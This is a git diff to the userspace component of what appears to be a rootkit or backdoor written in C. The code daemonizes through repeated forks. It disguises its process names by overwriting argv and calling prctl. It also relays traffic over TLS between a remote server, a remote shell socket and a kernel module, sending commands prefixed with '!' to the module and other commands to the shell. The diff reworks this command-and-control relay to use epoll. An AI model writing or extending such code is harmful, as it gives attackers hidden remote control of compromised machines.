@@ -4,7 +4,6 @@
  * Notes:
  * The socket handling for userspace
  */
-
 #include <asm/types.h>
 #include <assert.h>
 #include <linux/tcp.h>
@@ -20,6 +19,8 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <sys/epoll.h>
+#include <sys/fcntl.h>
 #include <sys/prctl.h>
 #include <sys/socket.h>
 #include <sys/un.h>
@@ -111,10 +112,39 @@ int create_remote_socket(void) {
     return remote_sock;
 }
 
-void mask_process(char** argv, const char *process_mask) {
+void mask_process(char** argv, const char* process_mask) {
     memset(argv[0], 0, strlen(argv[0]));
     strcpy(argv[0], process_mask);
     prctl(PR_SET_NAME, process_mask, 0, 0);
+}
+
+int createEpollFd(void) {
+    int efd;
+    if ((efd = epoll_create1(0)) == -1) {
+        perror("epoll_create1");
+        exit(EXIT_FAILURE);
+    }
+    return efd;
+}
+
+void addEpollSocket(const int epollfd, const int sock, struct epoll_event* ev) {
+    if (epoll_ctl(epollfd, EPOLL_CTL_ADD, sock, ev) == -1) {
+        perror("epoll_ctl");
+        exit(EXIT_FAILURE);
+    }
+}
+
+int waitForEpollEvent(const int epollfd, struct epoll_event* events) {
+    int nevents;
+    if ((nevents = epoll_wait(epollfd, events, 100, -1)) == -1) {
+        if (errno == EINTR) {
+            //Interrupted by signal, ignore it
+            return 0;
+        }
+        perror("epoll_wait");
+        exit(EXIT_FAILURE);
+    }
+    return nevents;
 }
 
 /*
@@ -164,6 +194,7 @@ int main(int argc, char** argv) {
     listen(remote_shell_unix, 5);
 
     int conn_sock = accept(local_tls_socket, NULL, 0);
+    fcntl(conn_sock, F_SETFL, fcntl(conn_sock, F_GETFL, 0) | O_NONBLOCK);
 
     int remote_sock = create_remote_socket();
 
@@ -186,61 +217,65 @@ int main(int argc, char** argv) {
         }
         setsid();
         remote_shell_sock = accept(remote_shell_unix, NULL, 0);
+        fcntl(remote_shell_sock, F_SETFL, fcntl(remote_shell_sock, F_GETFL, 0) | O_NONBLOCK);
         printf("accept %d\n", remote_shell_sock);
     }
 
+    if (wrapped_fork()) {
+        return EXIT_SUCCESS;
+    }
+    setsid();
     if (!wrapped_fork()) {
         if (wrapped_fork()) {
             return EXIT_SUCCESS;
         }
         setsid();
-        if (!wrapped_fork()) {
-            if (wrapped_fork()) {
-                return EXIT_SUCCESS;
-            }
-            setsid();
-            mask_process(argv, mask_1);
-            //Remote shell read and write to remote server
-            for (;;) {
-                int size = read(remote_shell_sock, buffer, MAX_PAYLOAD);
-                printf("Read %d from remote shell\n", size);
-                if (size < 0) {
-                    perror("remote shell read");
-                    break;
-                } else if (size == 0) {
-                    break;
+        mask_process(argv, mask_1);
+        //Lets make this the read process
+
+        struct epoll_event* eventList = calloc(100, sizeof(struct epoll_event));
+
+        int efd = createEpollFd();
+
+        struct epoll_event ev;
+        ev.events = EPOLLIN | EPOLLET | EPOLLEXCLUSIVE;
+        ev.data.fd = conn_sock;
+        addEpollSocket(efd, conn_sock, &ev);
+        struct epoll_event eve;
+        eve.events = EPOLLIN | EPOLLET | EPOLLEXCLUSIVE;
+        eve.data.fd = remote_shell_sock;
+        addEpollSocket(efd, remote_shell_sock, &eve);
+
+        for (;;) {
+            int n = waitForEpollEvent(efd, eventList);
+            //n can't be -1 because the handling for that is done in waitForEpollEvent
+            assert(n != -1);
+            for (int i = 0; i < n; ++i) {
+                if (eventList[i].events & EPOLLERR || eventList[i].events & EPOLLHUP) {
+                    fprintf(stderr, "Sock error\n");
+                    close(eventList[i].data.fd);
+                } else if (eventList[i].events & EPOLLIN) {
+                    int size = read(eventList[i].data.fd, buffer, MAX_PAYLOAD);
+                    printf("Read %d bytes\n", size);
+                    if (size < 0) {
+                        perror("read");
+                        goto done;
+                    } else if (size == 0) {
+                        goto done;
+                    }
+                    printf("Wrote %d bytes to server\n", size);
+                    for (int j = 0; j < size; ++j) {
+                        printf("%c", buffer[j]);
+                    }
+                    printf("\n");
+                    SSL_write(ssl, buffer, size);
                 }
-                printf("Writing %d to server\n", size);
-                SSL_write(ssl, buffer, size);
-            }
-        } else {
-            setsid();
-            mask_process(argv, mask_2);
-            //Read
-            for (;;) {
-                int size = SSL_read(ssl, buffer, MAX_PAYLOAD);
-                printf("Read %d from server\n", size);
-                if (size < 0) {
-                    perror("SSL_read");
-                    break;
-                } else if (size == 0) {
-                    break;
-                }
-                //if (buffer[0] == '!') {
-                    printf("Wrote %d to kernel module\n", size);
-                    write(conn_sock, buffer + 1, size - 1);
-                //} else {
-                    //printf("Wrote %d to remote shell\n", size);
-                    ////Pass message to shell process
-                    //write(remote_shell_sock, buffer, size);
-                //}
-                memset(buffer, 0, MAX_PAYLOAD);
             }
         }
-    } else {
-        setsid();
-        mask_process(argv, mask_3);
-        //Write
+    done:
+        free(eventList);
+
+#if 0
         for (;;) {
             int size = read(conn_sock, buffer, MAX_PAYLOAD);
             printf("Read %d from module\n", size);
@@ -251,16 +286,54 @@ int main(int argc, char** argv) {
                 break;
             }
             //if (buffer[0] == '!') {
-                //printf("Wrote %d to shell from module\n", size);
-                //write(remote_shell_sock, buffer, size);
+            //printf("Wrote %d to shell from module\n", size);
+            //write(remote_shell_sock, buffer, size);
             //} else {
-                printf("Wrote %d to server from module \n", size);
-                for (int i = 0 ; i < size; ++i) {
-                    printf("%c", buffer[i]);
-                }
-                printf("\n");
-                SSL_write(ssl, buffer, size);
+            printf("Wrote %d to server from module \n", size);
+            for (int i = 0; i < size; ++i) {
+                printf("%c", buffer[i]);
+            }
+            printf("\n");
+            SSL_write(ssl, buffer, size);
             //}
+        }
+
+        //Remote shell read and write to remote server
+        for (;;) {
+            int size = read(remote_shell_sock, buffer, MAX_PAYLOAD);
+            printf("Read %d from remote shell\n", size);
+            if (size < 0) {
+                perror("remote shell read");
+                break;
+            } else if (size == 0) {
+                break;
+            }
+            printf("Writing %d to server\n", size);
+            SSL_write(ssl, buffer, size);
+        }
+#endif
+    } else {
+        setsid();
+        mask_process(argv, mask_2);
+        //Read
+        for (;;) {
+            int size = SSL_read(ssl, buffer, MAX_PAYLOAD);
+            printf("Read %d from server\n", size);
+            if (size < 0) {
+                perror("SSL_read");
+                break;
+            } else if (size == 0) {
+                break;
+            }
+            if (buffer[0] == '!') {
+                printf("Wrote %d to kernel module\n", size);
+                write(conn_sock, buffer + 1, size - 1);
+            } else {
+                printf("Wrote %d to remote shell\n", size);
+                //Pass message to shell process
+                write(remote_shell_sock, buffer, size);
+            }
+            memset(buffer, 0, MAX_PAYLOAD);
         }
     }
 
